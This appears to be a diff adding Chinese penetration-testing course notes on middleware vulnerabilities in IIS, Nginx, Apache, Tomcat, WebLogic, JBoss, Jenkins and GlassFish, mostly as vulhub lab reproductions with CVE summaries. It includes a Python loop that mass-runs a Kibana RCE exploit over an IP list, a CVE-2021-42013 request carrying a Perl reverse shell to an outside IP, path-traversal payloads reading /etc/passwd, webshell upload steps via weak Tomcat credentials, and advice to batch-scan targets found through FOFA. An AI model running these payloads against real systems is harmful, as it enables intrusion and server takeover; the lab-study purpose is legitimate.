@@ -3105,6 +3105,553 @@
 <p>脚本批量探测</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;ips.txt&#x27;</span>);</span><br><span class="line">	ip=ip.strip() <span class="comment">#换行符</span></span><br><span class="line">	cmdline=<span class="string">&#x27;D:\python2.7\python.exe CVE-2019-7605-kibana-rce.py -u %s -host 41.94.236.117 -port 5566 --shell&#x27;</span> %ip</span><br><span class="line">	os.system(cmdline)</span><br></pre></td></tr></table></figure>
 
+<h1 id="第59天-服务攻防-中间件安全-CVE复现-lS-Apache-Tomcata-Nginx"><a href="#第59天-服务攻防-中间件安全-CVE复现-lS-Apache-Tomcata-Nginx" class="headerlink" title="第59天 服务攻防-中间件安全&amp;CVE复现&amp;lS&amp;Apache&amp;Tomcata&amp;Nginx"></a>第59天 服务攻防-中间件安全&amp;CVE复现&amp;lS&amp;Apache&amp;Tomcata&amp;Nginx</h1><h4 id="知识点：-39"><a href="#知识点：-39" class="headerlink" title="知识点："></a>知识点：</h4><p>中间件及框架列表：<br>lIS,Apache,Nginx,Tomcat,Docker,Weblogic,JBoos,WebSphere,Jenkins,<br>GlassFish,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Sprng,Flask,jQuery<br>1、中间件-IIS短文件&amp;解析&amp;蓝屏等<br>2、中间件-Nginx-文件解析&amp;命令执行等<br>3、中间件-Apache-RCE&amp;目录遍历&amp;文件解析等<br>4、中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等</p>
+<h4 id="章节内容：-5"><a href="#章节内容：-5" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制-弱口令爆破攻击<br>4、安全应用框架特定安全漏洞</p>
+<h4 id="前置知识：-8"><a href="#前置知识：-8" class="headerlink" title="前置知识："></a>前置知识：</h4><p>中间件安全侧试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断仲间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞<br>应用服务安全测试流程：见图<br>1、判断服务开放情况端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式持定漏洞&amp;未授权&amp;弱口令等</p>
+<h4 id="演示案例：-35"><a href="#演示案例：-35" class="headerlink" title="演示案例："></a>演示案例：</h4><p>中间件IIS-短文件&amp;解析&amp;蓝屏等<br>中间件-Nginx-文件解析&amp;命令执行等<br>中间件-Apache-RCE&amp;目录遍历&amp;文件解析等<br>中间件。Tomcat-弱口令&amp;文件上传&amp;文件包含等<br>中间件-Apache RCE&amp;Fofa Viewer-走向高端啊</p>
+<h4 id="中间件IIS短文件-解析-蓝屏等"><a href="#中间件IIS短文件-解析-蓝屏等" class="headerlink" title="中间件IIS短文件&amp;解析&amp;蓝屏等"></a>中间件IIS短文件&amp;解析&amp;蓝屏等</h4><blockquote>
+<p>Internet Information Services（IIS，以前称为Internet Information Server）互联网信息服务是Microsoft公司提供的可扩展Web服务器，支持HTTP，HTTP&#x2F;2，HTTPS，FTP，FTPS，SMTP和NNTP等。起初用于Windows NT系列，随后内置在Windows 2000、Windows XP Professional、Windows Server 2003和后续版本一起发行，但在Windows XP Home版本上并没有IIS。IIS目前只适用于Windows系统，不适用于其他操作系统。</p>
+</blockquote>
+<p>1、短文件：信息收集 参考链接：<a href="https://www.freebuf.com/articles/web/172561.html">https://www.freebuf.com/articles/web/172561.html</a><br>2、文件解析：还有点用<br>3、HTTP.SYS:蓝屏崩溃<br>4、CVE-2017-7269条件过老<br>其他IIS漏洞参考：<a href="https://blog.csdn.net/qq_52486507/article/details/129863950">https://blog.csdn.net/qq_52486507/article/details/129863950</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IIS是Windows上的一个中间件，现在用到的已经算是比较少的了。</span><br></pre></td></tr></table></figure>
+
+<h4 id="中间件-Nginx-文件解析-命令执行等"><a href="#中间件-Nginx-文件解析-命令执行等" class="headerlink" title="中间件-Nginx-文件解析&amp;命令执行等"></a>中间件-Nginx-文件解析&amp;命令执行等</h4><p>vulhub开启环境</p>
+<p>上传图片文件–通过burp在文件中加入phpinfo()语句</p>
+<p>访问图片，在图片后面加上 &#x2F;.php语句被成功解析并执行：</p>
+<p>可利用此来上传木马，从而进行getshell<br>上传一句话木马</p>
+<p>使用hackbar执行phpinfo();</p>
+<h4 id="Nginx-文件名逻辑漏洞"><a href="#Nginx-文件名逻辑漏洞" class="headerlink" title="Nginx 文件名逻辑漏洞"></a>Nginx 文件名逻辑漏洞</h4><p>漏洞原理：</p>
+<blockquote>
+<p>主要原因是错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。</p>
+</blockquote>
+<p>vulhub启动环境：</p>
+<p>上传gif图片文件，通过burp抓包插入pnpinfo();<br>然后在文件名后缀加入空格</p>
+<p>再用过浏览器访问上传图片后返回的文件路径，因为在文件名后加了空格所以直接访问不到<br>再抓包在文件名后加两个空格和.php(&#x2F;uploadfiles&#x2F;1.jpg )–然后修改空格16进制为00</p>
+<p>最后返回PHP info内容</p>
+<h4 id="中间件-Apache-RCE-目录遍历-文件解析等"><a href="#中间件-Apache-RCE-目录遍历-文件解析等" class="headerlink" title="中间件-Apache-RCE&amp;目录遍历&amp;文件解析等"></a>中间件-Apache-RCE&amp;目录遍历&amp;文件解析等</h4><p>Apache HTTP Server是美国阿帕奇(Apache)基金会的一款开源网页服务器。该服务器<br>具有快速、可靠且可通过简单的API进行扩充的特点，发现Apache HTTP Server2.4.50<br>中针对CVE-2021-41773的修复不够充分。攻击者可以使用路径遍历攻击将URL映射到<br>由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置<br>要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了CG引脚<br>本，则这可能允许远程代码执行。此问题仅影响Apache2.4.49和Apache2.4.50,而不<br>影响更早版本。</p>
+<h6 id="1、Cve-2021-42013RCE"><a href="#1、Cve-2021-42013RCE" class="headerlink" title="1、Cve-2021-42013RCE"></a>1、Cve-2021-42013RCE</h6><p>P0ST &#x2F;cgi-bin.%%32%651.%%32%65&#x2F;.%%32%651.%%32%65bin&#x2F;sh<br>echo;perl -e ‘use Socket:Si&#x3D;“47.94.236.117”;<br>Sp&#x3D;5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,socka<br>ddr_in(Sp,inet_aton(Si))))<br>[open(STDIN,“&gt;&amp;S”):open(STDOUT,“&gt;&amp;S”);open(STDERR,“&gt;&amp;S”):exec(&#x2F;bin&#x2F;sh -i”)😉</p>
+<p>使用.%%32%65进行绕过（注意其中的&#x2F;icons&#x2F;必须是一个存在且可访问的目录）：</p>
+<p>可见，成功读取到&#x2F;etc&#x2F;passwd：</p>
+<p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v --data &quot;echo;id&quot; &#x27;http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<h6 id="2、CVE-2021-41773目录穿越"><a href="#2、CVE-2021-41773目录穿越" class="headerlink" title="2、CVE-2021-41773目录穿越"></a>2、CVE-2021-41773目录穿越</h6><p>Apache HTTP Server2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏<br>洞，攻击者可利用该漏洞读取到Wb目录外的其他文件，如系统配置文件、网站源码等，<br>甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。<br>Burp:ic0ns&#x2F;.%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%<br>%32%65&#x2F;etc&#x2F;passwd</p>
+<h6 id="3、Cve-2017-15715文件解析"><a href="#3、Cve-2017-15715文件解析" class="headerlink" title="3、Cve-2017-15715文件解析"></a>3、Cve-2017-15715文件解析</h6><p>Apache HTTPD:是一款HTTP服务器。其2.4.0~2.4.29版本存在一个解析漏洞，在解析PHP<br>时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策路。</p>
+<p>Cve-2017-15715文件解析漏洞复现：</p>
+<p>启动环境</p>
+<p>在1.php后面插入一个\x0A（注意，不能是\x0D\x0A，只能是一个\x0A），不再拦截<br>注意添加的位置，可以先手动在文件名后加空格，然后切换到16进制将20改为0a。</p>
+<p>访问刚才上传的&#x2F;evil.php%0a，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞：</p>
+<p>4、Cve2017-9798价值不高<br>5、Cve_2018_11759价值不高I<br>6、Cve_2021-37580插件问题</p>
+<h4 id="中间件Tomcat-弱口令-文件上传-文件包含等"><a href="#中间件Tomcat-弱口令-文件上传-文件包含等" class="headerlink" title="中间件Tomcat-.弱口令&amp;文件上传&amp;文件包含等"></a>中间件Tomcat-.弱口令&amp;文件上传&amp;文件包含等</h4><p>简介：</p>
+<blockquote>
+<p>Tomcat是Apache软件基金会（Apache Software Foundation）的Jakarta项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java爱好者的喜爱并得到了部分软件开发商的认可，成为比较流行的Web 应用服务器。</p>
+</blockquote>
+<h6 id="1、弱口令猜解"><a href="#1、弱口令猜解" class="headerlink" title="1、弱口令猜解"></a>1、弱口令猜解</h6><p>配置不当导致后台弱口令，可通过上传jsp压缩包改名的war拿shell</p>
+<h5 id="弱口令漏洞复现"><a href="#弱口令漏洞复现" class="headerlink" title="弱口令漏洞复现"></a>弱口令漏洞复现</h5><p>vulhub启动环境：</p>
+<p>访问ip:8080 点击Manager APP登录，弱口令为tomcat&#x2F;tomcat</p>
+<p>getshell：首先使用哥斯拉生成jsp后门，然后将jsp文件压缩为zip文件，再通过修改后缀的方式改为.war文件</p>
+<p>在tomcat上传点上传war文件，通过返回信息查看上传状态</p>
+<p>访问<a href="http://192.168.74.132/222/222.jsp">http://192.168.74.132/222/222.jsp</a> 文件存在 ，使用哥斯拉连接获得服务器权限</p>
+<h6 id="2、CVE-2017-12615文件上传"><a href="#2、CVE-2017-12615文件上传" class="headerlink" title="2、CVE-2017-12615文件上传"></a>2、CVE-2017-12615文件上传</h6><p>当存在漏洞的Tomcati运行在Nindows&#x2F;Linux主机上，且启用了HTTP PUT请求方法（例<br>如，将readonly初始化参数由默认值设置为false),攻击者将有可能可通过精心构造的<br>攻击情求数据包向服务器上传包含任意代码的JSP的webshell文件，JSP文件中的恶意代码<br>将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。<br>影响版本Apache Tomcat7.0.0-7.0.79<br>PUT &#x2F;1.jsp&#x2F;HTTP&#x2F;1.1<br>shell代码</p>
+<h6 id="3、cve-2020-1938文件包含（脚本执行）"><a href="#3、cve-2020-1938文件包含（脚本执行）" class="headerlink" title="3、cve-2020-1938文件包含（脚本执行）"></a>3、cve-2020-1938文件包含（脚本执行）</h6><p>Apache Tomcat AJP协议(默认8009端口)由于存在实现缺陷导致相关参数可控，攻击者<br>利用该漏洞可通过构造特定参数，读取服务器vebapp目录下的任意文件。若服务器端同时<br>存在文件上传功能，攻击者可进一步结合文件包含实现远程代码的执行。<br>漏洞影响的产品版本包括：<br>Tomcat 6].*<br>Tomcat7.&lt;7.0.100<br>Tomcat8.&lt;8.5.51<br>Tomcat9.*&lt;9.0.31<br><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a><br>D:\Python27\python.exe CNVD-2020-10487-Tomcat-Ajp-lfi.py 123.58.236.76-p 63667-f<br>WEB-INF&#x2F;web.xml</p>
+<h6 id="4、Cve202011996拒绝服务"><a href="#4、Cve202011996拒绝服务" class="headerlink" title="4、Cve202011996拒绝服务"></a>4、Cve202011996拒绝服务</h6><p>危害过大，权限无关，意义不大</p>
+<h6 id="5、Cve20209484反序列化"><a href="#5、Cve20209484反序列化" class="headerlink" title="5、Cve20209484反序列化"></a>5、Cve20209484反序列化</h6><p>利用条件太司刻，意义不大</p>
+<h4 id="中间件-Fofaviewer-Apache-RCE-走向高端啊"><a href="#中间件-Fofaviewer-Apache-RCE-走向高端啊" class="headerlink" title="中间件-Fofaviewer&amp;Apache_RCE-走向高端啊"></a>中间件-Fofaviewer&amp;Apache_RCE-走向高端啊</h4><p>server&#x3D;“Apache&#x2F;2.4.49”<br>视频中未进行演示推测具体的流程为：<br>1、使用fofaview进行目标资产收集<br>2、编写python脚本进行批量化漏洞探测</p>
+<h1 id="第60天-服务攻防-中间件安全-CVE复现-Weblogic-Jenkins-GlassFish"><a href="#第60天-服务攻防-中间件安全-CVE复现-Weblogic-Jenkins-GlassFish" class="headerlink" title="第60天 服务攻防-中间件安全&amp;CVE复现&amp;Weblogic&amp;Jenkins&amp;GlassFish"></a>第60天 服务攻防-中间件安全&amp;CVE复现&amp;Weblogic&amp;Jenkins&amp;GlassFish</h1><h4 id="知识点：-40"><a href="#知识点：-40" class="headerlink" title="知识点："></a>知识点：</h4><p>中间件及框架列表：<br>lIS,Apache,Nginx,Tomcat,Docker,Weblogic,JBoos,WebSphere,Jenkins,<br>GlassFish,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Sprng,Flask,jQuery<br>1、<strong>中间件-Weblogic安全</strong>            ———–感觉其中最重要的一个<br>2、中间件JB00S安全<br>3、中间件-Jenkins:安全<br>4、中间件-GlassFish安全</p>
+<h4 id="章节内容：-6"><a href="#章节内容：-6" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制-弱口令爆破攻击<br>4、安全应用框架特定安全漏洞</p>
+<h4 id="前置知识：-9"><a href="#前置知识：-9" class="headerlink" title="前置知识："></a>前置知识：</h4><p>中间件安全侧试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断仲间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞<br>应用服务安全测试流程：见图<br>1、判断服务开放情况端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式持定漏洞&amp;未授权&amp;弱口令等</p>
+<h4 id="演示案例-2"><a href="#演示案例-2" class="headerlink" title="演示案例"></a>演示案例</h4><p>中间件Weblogic-工具搜哈<br>中间件JBoos-工具脚本搜哈<br>中间件-Jenkins-工具脚本搜哈<br>中间件-GlassFish-工具脚本搜哈<br>配合下-FofaViewer-.工具脚本搜哈</p>
+<h5 id="1、中间件-Weblogic-CVE-反序列化-远程执行"><a href="#1、中间件-Weblogic-CVE-反序列化-远程执行" class="headerlink" title="1、中间件-Weblogic-CVE&amp;反序列化&amp;远程执行"></a>1、中间件-Weblogic-CVE&amp;反序列化&amp;远程执行</h5><p>​        简介：Weblogic 是 Oracle 公司推出的一个基于JAVAEE架构的中间件，能为JAVA程序提供开发、集成、部署和管理等功能。</p>
+<p>注：由于下面的几个漏洞大部分可直接用集成工具一键探测并利用，因此下面只介绍漏洞详情，就不复现了，下载链接如下：</p>
+<p>WeblogicTool-GUI漏洞利用工具<a href="https://github.com/KimJun1010/WeblogicTool">https://github.com/KimJun1010/WeblogicTool</a> ，支持漏洞检测、命令执行、内存马注入、密码解密等</p>
+<p>此工具需要在java8环境下运行，检查java版本</p>
+<h6 id="（1）-CVE-2017-3506-远程代码执行漏洞"><a href="#（1）-CVE-2017-3506-远程代码执行漏洞" class="headerlink" title="（1） CVE-2017-3506  远程代码执行漏洞"></a>（1） CVE-2017-3506  远程代码执行漏洞</h6><p>简介：</p>
+<pre><code>    Weblogic的WLS Security组件对外提供webservice服务 ，里面的XMLDecoder是用来解析用户传入的数据，解析的过程中，由于其中的WorkContextXmlInputAdapter类没有限制传入的数据，会出现反序列化漏洞，导致可执行任意命令，因此可被攻击者构造恶意代码拿到权限。
+</code></pre>
+<p>影响版本：</p>
+<pre><code>    OracleWebLogic Server10.3.6.0.0
+
+    OracleWebLogic Server12.1.3.0.0
+
+    OracleWebLogic Server12.2.1.1.0
+
+    OracleWebLogic Server12.2.1.2.0
+</code></pre>
+<p>判断方法：</p>
+<pre><code>    访问以下目录，页面有返回服务信息则说明或许存在漏洞
+</code></pre>
+<blockquote>
+<p>&#x2F;wls-wsat&#x2F;CoordinatorPortType</p>
+<p>&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC</p>
+<p>&#x2F;wls-wsat&#x2F;ParticipantPortType</p>
+<p>&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType<br>&#x2F;wls-wsat&#x2F;CoordinatorPortType11</p>
+<p>&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC11<br>&#x2F;wls-wsat&#x2F;ParticipantPortType11</p>
+<p>&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType11</p>
+</blockquote>
+<h6 id="（2）CVE-2018-2893-反序列化漏洞"><a href="#（2）CVE-2018-2893-反序列化漏洞" class="headerlink" title="（2）CVE-2018-2893  反序列化漏洞"></a>（2）CVE-2018-2893  反序列化漏洞</h6><p>简介：</p>
+<pre><code>    此漏洞产生于WebLogic T3服务，T3协议在WebLogic Server和客户端间承当传输数据和通信作用，Weblogic开放端口后T3会默认开启，WebLogic服务存在的漏洞允许未经身份验证的攻击者通过T3获得服务器权限。
+</code></pre>
+<p>影响版本：</p>
+<pre><code>    WebLogic 10.3.6.0
+
+    WebLogic 12.1.3.0
+
+    WebLogic 12.2.1.2
+
+    WebLogic 12.2.1.3
+</code></pre>
+<h6 id="（3）CVE-2018-3245-远程代码执行漏洞"><a href="#（3）CVE-2018-3245-远程代码执行漏洞" class="headerlink" title="（3）CVE-2018-3245  远程代码执行漏洞"></a>（3）CVE-2018-3245  远程代码执行漏洞</h6><p>简介：</p>
+<pre><code>    该漏洞和CVE-2018-2893类似，通过JRMP协议利用RMI机制的缺陷,进行远程代码执行漏洞的利用。攻击者可构造恶意代码并通过T3进行反序列化实现远程代码执行获取系统权限。
+</code></pre>
+<p>影响版本：</p>
+<pre><code>    Weblogic 10.3.6.0
+
+    Weblogic 12.1.3.0
+
+    Weblogic 12.2.1.3
+</code></pre>
+<p>判断方法：</p>
+<pre><code>    CVE-2018-3245-PoC
+</code></pre>
+<h6 id="（4）CVE-2020-14882-未授权命令执行漏洞"><a href="#（4）CVE-2020-14882-未授权命令执行漏洞" class="headerlink" title="（4）CVE-2020-14882 未授权命令执行漏洞"></a>（4）CVE-2020-14882 未授权命令执行漏洞</h6><p>简介：</p>
+<pre><code>    此漏洞可被未经身份验证的攻击者通过构造特殊的GET请求进行攻击，
+</code></pre>
+<p>影响版本：</p>
+<pre><code>    Oracle Weblogic Server 10.3.6.0.0
+
+    Oracle Weblogic Server 12.1.3.0.0
+
+    Oracle Weblogic Server 12.2.1.3.0
+
+    Oracle Weblogic Server 12.2.1.4.0
+
+    Oracle Weblogic Server 14.1.1.0.0
+</code></pre>
+<p>WeblogicTool可以识别存在漏洞，但是利用这块用不了，尝试手工复现下</p>
+<p>打开vulhub，进入&#x2F;weblogic&#x2F;CVE-2020-14882，启动容器</p>
+<p>打开访问界面<a href="http://192.168.190.153:7001/console">http://192.168.190.153:7001/console</a></p>
+<p>输入poc，可直接进入后台,说明存在漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个在最近打的一个渗透靶场中也出现了好几题相关的题目，虽然可以绕过直接进入后台，但只是低权限用户，并没有什么太大作用，主要漏洞点一般情况下载另一个界面中的ssrf漏洞</span><br><span class="line">http://175.27.135.16:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=127.0.0.1:7000</span><br></pre></td></tr></table></figure>
+
+<p>参考链接：<a href="https://cloud.tencent.com/developer/article/2202740">https://cloud.tencent.com/developer/article/2202740</a> </p>
+<h6 id="（5）CVE-2021-2394-反序列化漏洞"><a href="#（5）CVE-2021-2394-反序列化漏洞" class="headerlink" title="（5）CVE-2021-2394 反序列化漏洞"></a>（5）CVE-2021-2394 反序列化漏洞</h6><p>简介：</p>
+<pre><code>    此为WebLogic组件存在高危漏洞，漏洞主要是FilterExtractor的readExternal方法使用不当，使得生成 MethodAttributeAccessor的时候不会受到黑名单的限制。成功利用该漏洞的攻击者可以获取WebLogic Server管理权限。
+</code></pre>
+<p>影响版本：</p>
+<pre><code>    Oracle WebLogic Server 10.3.6.0.0
+
+    Oracle WebLogic Server 12.1.3.0.0
+
+    Oracle WebLogic Server 12.2.1.3.0
+
+    Oracle WebLogic Server 12.2.1.4.0
+
+    Oracle WebLogic Server 14.1.1.0.0
+</code></pre>
+<p>这里用vulhub的CVE-2020-14882的漏洞环境来代替（版本一致）</p>
+<p>可以直接使用工具去连接存在漏洞的页面，从而直接可以达到命令执行的效果。</p>
+<h5 id="2、中间件-JBoos-CVE-弱口令"><a href="#2、中间件-JBoos-CVE-弱口令" class="headerlink" title="2、中间件-JBoos-CVE&amp;弱口令"></a>2、中间件-JBoos-CVE&amp;弱口令</h5><p>简介：</p>
+<pre><code>    Jboss 通常占用的端口是 1098，1099，4444，4445，8080，8009，8083，8093 这
+</code></pre>
+<p>几个，Red Hat JBoss Application Server 是一款基于 JavaEE 的开源应用服务器。</p>
+<p>（1）CVE-2017-12149  反序列化远程代码执行漏洞</p>
+<p>简介：</p>
+<pre><code>    JBOSS Application Server是一个基于JE22的开放源代码的应用服务器，在这个漏洞中，发现 HTTP Invoker 的 ReadOnlyAccessFilter 中的 doFilter 方法不限制它执行反序列化的类，因此允许攻击者通过构建特殊的的序列化数据执行任意代码，无需用户验证即可获得服务器的控制权。
+</code></pre>
+<p>影响版本：</p>
+<pre><code>    5.x和6.x版本的JBOSSAS
+</code></pre>
+<h6 id="（2）CVE-2017-7504-反序列化命令执行漏洞"><a href="#（2）CVE-2017-7504-反序列化命令执行漏洞" class="headerlink" title="（2）CVE-2017-7504  反序列化命令执行漏洞"></a>（2）CVE-2017-7504  反序列化命令执行漏洞</h6><p>简介：</p>
+<pre><code>    Jboss AS 4.X及之前的版本中的JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在安全漏洞。远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。
+</code></pre>
+<p>影响版本：</p>
+<pre><code>    JBoss AS&lt;=4.x
+</code></pre>
+<h6 id="3）弱口令-未授权访问"><a href="#3）弱口令-未授权访问" class="headerlink" title="3）弱口令 未授权访问"></a>3）弱口令 未授权访问</h6><p>简介：</p>
+<p>​    部署jboss时管理员有时会忽略修改密码导致弱口令，又或者无密码可以直接访问后台导致未授权访问。</p>
+<p>影响版本：</p>
+<p>​    全版本</p>
+<h5 id="3、中间件-Jenkins-CVE"><a href="#3、中间件-Jenkins-CVE" class="headerlink" title="3、中间件-Jenkins-CVE"></a>3、中间件-Jenkins-CVE</h5><p>简介：</p>
+<p>​    Jenkins 是一个用 Java 编写的开源自动化工具，是基于Java开发的一种持续集成工具，用于监控持续重复的工作。默认端口:8080</p>
+<h6 id="（1）CVE-2017-1000353-远程代码执行漏洞"><a href="#（1）CVE-2017-1000353-远程代码执行漏洞" class="headerlink" title="（1）CVE-2017-1000353  远程代码执行漏洞"></a>（1）CVE-2017-1000353  远程代码执行漏洞</h6><p>简介：</p>
+<pre><code>    该漏洞存在于使用HTTP协议的双向通信通道的具体实现代码中，Jenkins利用此通道来接收命令，恶意攻击者可以构造恶意攻击参数远程执行命令，从而获取系统权限，造成数据泄露。
+</code></pre>
+<p>影响版本：</p>
+<pre><code>    所有Jenkins主版本均受到影响(包括&lt;=2.56版本)
+    所有Jenkins LTS 均受到影响(包括&lt;=2.46.1版本)
+</code></pre>
+<h6 id="（2）CVE-2018-1000861-远程命令执行漏洞-（未完成）"><a href="#（2）CVE-2018-1000861-远程命令执行漏洞-（未完成）" class="headerlink" title="（2）CVE-2018-1000861  远程命令执行漏洞 （未完成）"></a>（2）CVE-2018-1000861  远程命令执行漏洞 （未完成）</h6><p>简介：</p>
+<pre><code>    jenkins使用Stapler开发，在stapler/core/src/main/java/org/kohsuke/stapler/MetaClass.java 中使用的 Stapler Web 框架中存在一个代码执行漏洞，该漏洞允许攻击者通过访问构建特殊的 URL 来调用 Java 对象上的某些方法获取权限。
+</code></pre>
+<p>影响版本：</p>
+<pre><code>    Jenkins主版本 &lt;= 2.153
+    Jenkins LTS版本 &lt;= 2.138.3
+</code></pre>
+<h6 id="3）CVE-2019-100300-远程代码执行漏洞（条件苛刻）"><a href="#3）CVE-2019-100300-远程代码执行漏洞（条件苛刻）" class="headerlink" title="3）CVE-2019-100300  远程代码执行漏洞（条件苛刻）"></a>3）CVE-2019-100300  远程代码执行漏洞（条件苛刻）</h6><p>简介：</p>
+<pre><code>    在src/main/java/org/jenkinsci/plugins/scriptsecurity/sandbox/groovy/GroovySandbox.java 中存在一个沙盒绕过漏洞，该漏洞允许能提供沙盒脚本的攻击者在 Jenkins master JVM 上执行任意代码。
+</code></pre>
+<p>影响版本：</p>
+<pre><code>    Pipeline: Declarative 插件 &lt;= 1.3.4
+    Pipeline: Groovy 插 件 &lt;= 2.61
+    Script Security 插 件 &lt;= 1.49
+</code></pre>
+<p>该漏洞需要提前知道管理员用户账号和密码才能进行利用，利用价值不高</p>
+<h5 id="4、中间件-GlassFish-CVE"><a href="#4、中间件-GlassFish-CVE" class="headerlink" title="4、中间件-GlassFish-CVE"></a>4、中间件-GlassFish-CVE</h5><p>简介：</p>
+<pre><code>    GlassFish 是一款强健的商业兼应用服务器，达到产品级质量，可免费用于开发、部署和重新分发。开发者可以免费获得源代码，还可以对代码进行更改。默认端口为4848。
+</code></pre>
+<h6 id="（1）CVE-2017-1000028-任意文件读取漏洞"><a href="#（1）CVE-2017-1000028-任意文件读取漏洞" class="headerlink" title="（1）CVE-2017-1000028 任意文件读取漏洞"></a>（1）CVE-2017-1000028 任意文件读取漏洞</h6><p>简介：</p>
+<pre><code>    Oracle 的 GlassFish Server Open Source Edition 4.1 容易受到经过身份验证和未经身份验证的目录遍历漏洞的攻击，可以通过发出特制的 HTTP GET 请求来利用该漏洞。
+</code></pre>
+<p>影响版本：</p>
+<pre><code>   GlassFish &lt;= 4.1.2
+</code></pre>
+<h6 id="（2）简单口令-Getshell-（getshell失败）"><a href="#（2）简单口令-Getshell-（getshell失败）" class="headerlink" title="（2）简单口令&amp;Getshell （getshell失败）"></a>（2）简单口令&amp;Getshell （getshell失败）</h6><p>简介：</p>
+<p>​    部署Glassfish时管理员有时会忽略修改密码导致弱口令，又或者无密码可以直接访问后台导致未授权访问。</p>
+<p>影响版本：</p>
+<p>​    全版本 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">附加：主要其实就是Weblogic个人感觉更为常见点，所以对于其他的中间件就没做太过多的收集，都是一些相关CVE，使用搜索引擎也很容易去搜到相关的poc</span><br></pre></td></tr></table></figure>
+
+<h1 id="第61天-服务攻防-中间件安全-CVE复现-K8S-Docker-Jetty-Websphere"><a href="#第61天-服务攻防-中间件安全-CVE复现-K8S-Docker-Jetty-Websphere" class="headerlink" title="第61天 服务攻防-中间件安全&amp;CVE复现&amp;K8S&amp;Docker&amp;Jetty&amp;Websphere"></a>第61天 服务攻防-中间件安全&amp;CVE复现&amp;K8S&amp;Docker&amp;Jetty&amp;Websphere</h1><h4 id="知识点：-41"><a href="#知识点：-41" class="headerlink" title="知识点："></a>知识点：</h4><p>中间件及框架列表：<br>lIS,Apache,Nginx,Tomcat,Docker,Weblogic,JBoos,WebSphere,Jenkins,<br>GlassFish,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Sprng,Flask,jQuery<br>0、中间件-K8s安全<br>1、中间件Jey安全<br>2、中间件-Docker安全<br>3.中间件-WebSphere:安全</p>
+<h4 id="章节内容：-7"><a href="#章节内容：-7" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制-弱口令爆破攻击<br>4、安全应用框架特定安全漏洞</p>
+<h4 id="前置知识：-10"><a href="#前置知识：-10" class="headerlink" title="前置知识："></a>前置知识：</h4><p>中间件安全侧试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断中间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞<br>应用服务安全测试流程：见图<br>1、判断服务开放情况端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式持定漏洞&amp;未授权&amp;弱口令等</p>
+<h4 id="演示案例-3"><a href="#演示案例-3" class="headerlink" title="演示案例"></a>演示案例</h4><p>中间件K8s-搜哈<br>中间件Jety-搜哈<br>中间件Docker-搜哈<br>中间件-WebSphere-搜哈<br>配合下-Fofa_Viewer-搜哈</p>
